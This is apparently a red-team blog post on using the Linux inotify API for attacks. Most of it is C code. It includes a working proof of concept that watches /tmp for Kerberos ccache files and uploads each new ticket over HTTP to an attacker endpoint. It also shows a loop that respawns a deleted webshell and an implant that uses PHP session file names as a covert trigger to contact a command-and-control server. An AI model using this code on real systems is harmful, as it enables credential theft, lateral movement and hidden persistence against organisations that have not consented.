---
layout: post
title: Rethinking the inotify API as an offensive helper
date: 2019-04-01 11:00:00
categories: posts
en: true
description: Examples of how the inotify API can be useful for the Red Team 
keywords: "inotify, ccache, RedTeam, Red Team, hacking, pentest"
authors:
    - X-C3LL
---

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Historically speaking the [inotify API](http://man7.org/linux/man-pages/man7/inotify.7.html) has been, for far, more related with defensive tasks than with the offensive side. This is absolutely natural: through this API the IT administrators can monitor any change in files or directories, so it is a really helpful aid to detect the artifacts generated while an intrusion. But inotify can be used in an offensive way too, being a tool more to keep in mind __:)__. 


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Our humble intention with this brief (really brief) article is to expose some ideas around inotify and how it can be used in the context of a Red Team operation. Let's start!


## 0x00 Stealing ccache files


 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
In corporate networks, where linux and windows systems coexists in a mixed enviroment, can be natural to delegate the authentication to the Active Directory. In this kind of enviroments, when your first compromised server is a Linux machine, usually is fruitful to check for credential cache files. The credential cache (__ccache__) file holds the __TGT__ ([Ticket-Granting-Ticket](https://en.wikipedia.org/wiki/Kerberos_(protocol))) used to authenticate a user to a service via Kerberos, so as attackers we are highly interested in those juicy tickets.


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The ccache files by default are in /tmp with a format name like "__krb5cc_%UID%__" and can be used directly by the majority of tools based in the [Impacket Framework](https://github.com/SecureAuthCorp/impacket), so if we can read the file contents (_we pwned the server and got root before_) we can move laterally (or even escalate privileges if we are lucky enough to get a TGT from a privileged user) and execute commands via psexec.py/smbexec.py/whatever-impacket-tool.py in other machines. But... if no valid tickets are found (they have a lifetime relatively short) and we know that kerberos is used as authentication method... what can we do? Well... we can wait and set an inotify watcher to detect every new ticket generated and forward them to us __:)__.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Our plan is pretty simple: we are going to create a little watcher for the /tmp directory. If a file with the prefix "krb5cc_" is created or modified we are going to send it to an external endpoint controled by us. This can be accomplished via domain fronting or via DNS as we saw before in the article "[Exfiltrating credentials via PAM backdoors & DNS requests](https://x-c3ll.github.io/posts/PAM-backdoor-DNS/)". The code is self-explained:

```c
// Example based on https://www.lynxbee.com/c-program-to-monitor-and-notify-changes-in-a-directory-file-using-inotify/
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/inotify.h>
#include <sys/stat.h>
#include <limits.h>
#include <unistd.h>
#include <fcntl.h>
#include <curl/curl.h>

#define MAX_EVENTS 1024 /*Max. number of events to process at one go*/
#define LEN_NAME 1024 /*Assuming length of the filename won't exceed 16 bytes*/
#define EVENT_SIZE  ( sizeof (struct inotify_event)  ) /*size of one event*/
#define BUF_LEN     ( MAX_EVENTS * ( EVENT_SIZE + LEN_NAME  ) ) /*buffer to store the data of events*/

#define endpoint "http://localhost:4444"

int exfiltrate(char* filename) {
    CURL *curl;
    CURLcode res;
    struct stat file_info;
    FILE *fd;

    fd = fopen(filename, "rb");
    if(!fd){
        return -1;
    }
    if(fstat(fileno(fd), &file_info) != 0) {
        return -1;
    }
    curl = curl_easy_init();
    if (curl){
        curl_easy_setopt(curl, CURLOPT_URL, endpoint);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
        curl_easy_setopt(curl, CURLOPT_READDATA, fd);
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            return -1;
        }
        curl_easy_cleanup(curl);
    }       
    fclose(fd);
    return 0;
}

int main(int argc, char **argv){
    int length, i= 0, wd;
    int fd; 
    char buffer[BUF_LEN];
    char *ticketloc = NULL;

    printf("[Kerberos ccache exfiltrator PoC]\n\n");
   
    //Initiate inotify
    if ((fd = inotify_init()) < 0) {
        printf("Could not initiate inotify!!\n");
        return -1;
    }

    //Add a watcher for the creation or modification of files at /tmp folder
    if ((wd = inotify_add_watch(fd, "/tmp", IN_CREATE | IN_MODIFY)) == -1) {
        printf("Could not add a watcher!!\n");
        return -2;
    }

    //Main loop 
    while(1) {
        i = 0;
        length = read(fd, buffer, BUF_LEN);
        if (length < 0) {
            return -3;
        }

        while (i < length) {
            struct inotify_event *event = (struct inotify_event *)&buffer[i];
            if (event->len) {
                    //Check for prefix
                    if (strncmp(event->name, "krb5cc_", strlen("krb5cc_")) == 0){
                        printf("New cache file found! (%s)", event->name);
                        asprintf(&ticketloc, "/tmp/%s",event->name);
                        //Forward it to us
                        if (exfiltrate(ticketloc) != 0) {
                            printf(" - Failed!\n");
                        }
                        else {
                            printf(" - Exfiltrated!\n");
                        }
                        free(ticketloc);
                    }
                i += EVENT_SIZE + event->len;
            }
        }
    }

}
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Of course this is just an option to get notified (and to steal inmediately) when a new ccache file is created. A really great idea is to combine this with a search via LDAP to check if the file corresponds to a privileged user and then act accordingly __:)__.


## 0x01 Re-infecting CMS installations
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
A common problem related with webshells and similar persistence methods is that they can vanish in just a moment when the web application is updated (for example, to fix the vulnerability that we just exploited). We can use inotify to monitor when our webshell is deleted and then create a new one (and alert us about this action). We only need to change the mask used to filter the events:

```c
int main(int argc, char **argv){
    int length, i= 0, wd;
    int fd; 
    char buffer[BUF_LEN];

    //Initiate inotify
    if ((fd = inotify_init()) < 0) {
        printf("Could not initiate inotify!!\n");
        return -1;
    }

    //Webshell location
    if ((wd = inotify_add_watch(fd, "/var/www/html/my_shinny_webshell.php", IN_DELETE | IN_DELETE_SELF) == -1) {
        printf("Could not add a watcher!!\n");
        return -2;
    }

    //Main loop 
    while(1) {
        i = 0;
        length = read(fd, buffer, BUF_LEN);
        if (length < 0) {
            return -3;
        }

        while (i < length) {
            struct inotify_event *event = (struct inotify_event *)&buffer[i];
            if (event->len) {
                
      			respawn_webshell();
                
                i += EVENT_SIZE + event->len;
            }
        }
    }

}
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Another related idea is to check when a legit PHP file was modified and then add our backdoor to that file. Or, for example, we can monitor config files to check if the credentials are changed at some point after our intrusion.


## 0x02 Trigger malware actions based on session names (PHP)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
We can use the name of the files created to store PHP sessions as a covert channel in order to communicate commands to our implants. For example, imagine a perimetral web server with an application made in PHP that was pwned by us, where our unique way to interact with our implants is via the web. If we are not interested in generate too much outbound traffic via polling an idea to keep in mind (and yes, there are tons of alternatives, this is just one more to add to your playbook) is to use inotify to monitor the directory where PHP sessions are created and create a trigger based on that. When a condition is met (for example, the creation of a file with the name sess_ALEAIACTAESTXX) we start the comunication with the C&C.

```c
int main(int argc, char **argv){
    int length, i= 0, wd;
    int fd; 
    char buffer[BUF_LEN];


    //Initiate inotify
    if ((fd = inotify_init()) < 0) {
        printf("Could not initiate inotify!!\n");
        return -1;
    }

    //Session folder as set in session.save_path
    if ((wd = inotify_add_watch(fd, "/var/lib/php/session", IN_CREATE) == -1) {
        printf("Could not add a watcher!!\n");
        return -2;
    }

    //Main loop 
    while(1) {
        i = 0;
        length = read(fd, buffer, BUF_LEN);
        if (length < 0) {
            return -3;
        }

        while (i < length) {
            struct inotify_event *event = (struct inotify_event *)&buffer[i];
            if (event->len) {
                
                    if (strncmp(event->name, "sess_ALEAIACTAEST", strlen("sess_ALEAIACTAEST")) == 0){
                        start_communication_with_CC();
                    }
                
                i += EVENT_SIZE + event->len;
            }
        }
    }

}
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
With a simple Curl request (`curl http://localhost/test.php --cookie "PHPSESSID=ALEAIACTAESTx1"`) we can trigger the action.

## 0x03 Final words
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
As I said in the introduction this is a brief article to give you some ideas related with inotify. Probably I gonna edit this post in the future to increase it with more ideas, but If you already have one, feel free to ping me at twitter ([@TheXC3LL](https://twitter.com/TheXC3LL).
